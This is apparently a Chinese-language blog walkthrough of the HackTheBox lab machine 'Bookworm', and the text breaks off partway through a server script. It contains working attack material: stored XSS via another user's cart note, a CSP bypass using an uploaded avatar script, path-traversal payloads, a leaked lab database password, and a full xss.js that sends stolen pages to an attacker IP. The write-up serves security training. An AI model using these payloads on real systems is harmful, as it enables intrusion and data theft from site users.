---
title: Bookworm - HackTheBox
url: https://darkwing.moe/2023/05/29/Bookworm-HackTheBox/
source: 喵喵喵喵
date: 2023-05-30
fetch_date: 2025-10-04T11:36:51.210261
---

# Bookworm - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Bookworm - HackTheBox

# Bookworm - HackTheBox

##### 2023-05-29

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. Bookworm](#Bookworm)
   1. [3.1. XSS](#XSS)
   2. [3.2. CSP Bypass](#CSP-Bypass)
4. [4. XSS](#XSS-1)
   1. [4.1. LFI](#LFI)
   2. [4.2. index.js](#index-js)
   3. [4.3. database.js](#database-js)
   4. [4.4. xss.js](#xss-js)
   5. [4.5. server.py](#server-py)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. 提权 & root flag (非预期)](#提权-amp-root-flag-非预期)
   1. [7.1. shadow](#shadow)
8. [8. 补充 预期root方法](#补充-预期root方法)
9. [9. calibre converter](#calibre-converter)
   1. [9.1. write ssh key](#write-ssh-key)
10. [10. genlabel](#genlabel)
11. [11. 提权 & root](#提权-amp-root)
12. [12. 参考资料](#参考资料)

# Bookworm - HackTheBox

2023-05-29

# 基本信息

* <https://app.hackthebox.com/machines/Bookworm>
* 10.10.11.215

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052901.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.215 Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-29 11:27 CST Nmap scan report for 10.10.11.215 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 81:1d:22:35:dd:21:15:64:4a:1f:dc:5c:9c:66:e5:e2 (RSA) |   256 01:f9:0d:3c:22:1d:94:83:06:a4:96:7a:01:1c:9e:a1 (ECDSA) |_  256 64:7d:17:17:91:79:f6:d7:c4:87:74:f8:a2:16:f7:cf (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://bookworm.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 51.82 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.215 bookworm.htb ``` |

一个在线书店：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052902.jpg)

# Bookworm

随意注册登录，发现可以看到其他人最近活动，这应该是一个bot：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052903.jpg)

## XSS

简单测试功能，添加书籍到购物车，查看购物车发现edit note功能：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052904.jpg)

编辑后的内容会在下一步checkout中显示：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052905.jpg)

验证是无过滤，但有CSP

另外这一步也可以确认可以随意修改任意购物车id的note，所以应该就是去修改那些bot的购物车备注打XSS

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052906.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052907.jpg)

## CSP Bypass

CSP很简单的设置的self，self中我们可控的那就是头像了，简单的%00来上传(其实不需要，修改文件名只是过前端校验，传上去是直接用户id的，不需要用文件名trick),然后去验证成功绕过CSP：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052908.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052909.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052910.jpg)

# XSS

所以整个步骤应该就是头像上传js绕过CSP，越权修改购物车备注去XSS打bot，但cookie是httponly，并不能直接简单的获取cookie，需要通过XHR一步步来,discord里提供了完整的xss代码和接收数据的server代码，放在后面了

先从基础的profile测试开始，首页源码里可以得到bot的购物车id，测试越权修改打XSS：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052911.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052912.jpg)

得到bot的订单信息，同样自动去查看他们的订单内容,发现下载选项：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052913.jpg)

## LFI

下载是通过id来的，修改id可以进行LFI,同样还是要通过XSS XHR：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` bookIds=../../../../../../../../etc/passwd ``` |

下载下来的文件是一个压缩包，直接解压会变成一个目录，rename就能正常查看：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052914.jpg)

## index.js

nodejs应用，一步步读代码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` bookIds=../../../../../../../../proc/self/cwd/index.js ``` |

index.js中发现引入了database:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052915.jpg)

## database.js

继续读database.js,得到账号密码:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` bookIds=../../../../../../../../proc/self/cwd/database.js  dialectOptions: {   host: "127.0.0.1",   user: "bookworm",   database: "bookworm",   password: "FrankTh3JobGiver", }, ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052916.jpg)

## xss.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ``` | ``` function get_orders(html_page) {   const parser = new DOMParser();   const htmlString = html_page;   const doc = parser.parseFromString(htmlString, 'text/html');   const orderLinks = doc.querySelectorAll('tbody a');   const orderUrls = Array.from(orderLinks).map((link) => link.getAttribute('href'));   return orderUrls; } function getDownloadURL(html) {   const container = document.createElement('div');   container.innerHTML = html;   const downloadLink = container.querySelector('a[href^="/download"]');   const downloadURL = downloadLink ? downloadLink.href.substring(0, downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../../../etc/passwd" : null;   return downloadURL; } function fetch_url_to_attacker(url) {   var attacker = "http://10.10.14.6/?url=" + encodeURIComponent(url);   fetch(url).then(async (response) => {     fetch(attacker, { method: 'POST', body: await response.arrayBuffer() });   }); } async function get_pdf(url) {   const response = await fetch(url);   const html = await response.text();   const downloadURL = getDownloadURL(html);   if (downloadURL) {     fetch_url_to_attacker(downloadURL);   } } fetch("http://10.10.14.6/?trying"); fetch("http://bookworm.htb/profile")   .then(async (response) => {     const html = await response.text();     const orders = get_orders(html);     for (const path of orders) {       const fullUrl = "http://bookworm.htb" + path;       fetch_url_to_attacker(fullUrl);       get_pdf(fullUrl);     }   }); ``` |

## server.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 ``` | ``` from http.server import SimpleHTTPRequestHandler, HTTPServer import random from urllib.parse import urlparse, parse_qs  class RequestHandler(SimpleHTTPRequestHandler): 	def do_POST(self): 		# print(self.headers) 		 		parsed_url = urlparse(self.path) 		query_params = parse_qs(parsed_url.query) 		if 'url' in query_params: 			print(query_params['url'][0]) 			 		# Handle POST request here 		content_length = int(self.headers['Content-Length']) 		post_data = self.rfile.read(content_length) 		 		# print(f'POST data: {post_data.decode()}') 		# if post_data.decode().isprintable(): 		#     print(f'POST data: {post_data.decode()}') 		# else: 		filename = 'temp' + str(random.randint(0, 9999)) 		with open(filename,'wb') as f: 			f.write(post_data) 		print("Non ascii characters detected!! Content written to ./{} file instead.".format(filename)) 		 		self.send_response(200) 		self.send_header('Content-type', 'text/html') 		self.end_headers() 		self.wfile.write(b'POST request received') 		 	def do_GET(self): 		# print(self.headers) 		parsed_url = urlparse(self.path) 		query_params = parse_qs(parsed_url.query) 		if 'url' in query_params: 			print(query_params['url'][0]) 			 		SimpleHTTPRequestHandler.do_GET(self) 		 def run_server(): 	server_address = ('', 80) 	httpd = HTTPServer(server_address, RequestHandler) 	print('Se...